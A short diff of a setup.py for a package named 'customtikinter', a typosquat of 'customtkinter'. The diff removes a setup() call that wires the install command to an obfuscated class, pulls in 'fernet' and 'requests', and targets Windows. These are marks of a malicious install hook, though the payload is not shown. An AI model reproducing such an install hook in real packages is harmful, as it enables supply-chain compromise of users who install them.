@@ -18,22 +18,5 @@ class SoDIsBtNsJfwyXeZlALMXKbnVSQaXPujWJvVgDGdXugwvJmLsAIAfliqnegYhEYMmJZDJl(ins
             install.run(self)
 
 
-setup(
-    name="customtikinter",
-    version=VERSION,
-    author="nEsgMObhhor",
-    author_email="OPRsutd@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': SoDIsBtNsJfwyXeZlALMXKbnVSQaXPujWJvVgDGdXugwvJmLsAIAfliqnegYhEYMmJZDJl,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
 
